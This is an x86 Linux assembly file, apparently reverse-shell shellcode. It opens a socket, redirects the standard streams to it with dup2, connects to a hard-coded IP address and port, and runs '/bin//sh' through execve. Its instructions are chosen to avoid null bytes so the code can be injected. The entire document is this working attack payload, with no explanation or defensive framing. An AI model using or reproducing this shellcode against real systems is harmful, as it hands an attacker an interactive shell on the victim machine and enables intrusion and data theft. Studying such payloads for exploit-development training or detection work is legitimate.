global _start			

section .text
_start:
	
	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx
	xor edx, edx

	;socket
	mov bl, 0x1
	push eax
	push byte 0x1
	push byte 0x2
	
	mov ecx, esp		;Pointer to socket arguments

	mov al, 0x66
	int 0x80
	mov ebx, eax


	;dup2	
	xor ecx, ecx
	xor eax, eax
	mov cl, 3
here:
	push cx
	dec cl
	mov al, 0x3f
	int 0x80
	pop cx
	loop here


	;connect
	xor eax, eax

	push eax
	push 0xc0c0c0c0		;IP address
	push word 0x5111	;Port
	push word 0x2
	mov ecx, esp
	mov dl, 0x10		;Size of struct

	mov ax, 0x16a
	int 0x80

	;execve
	xor eax, eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx, esp		;Pointer for filename

	push eax
	mov edx, esp

	push ebx
	mov ecx, esp		;Pointer for filename address
	
	mov al, 11
	int 0x80
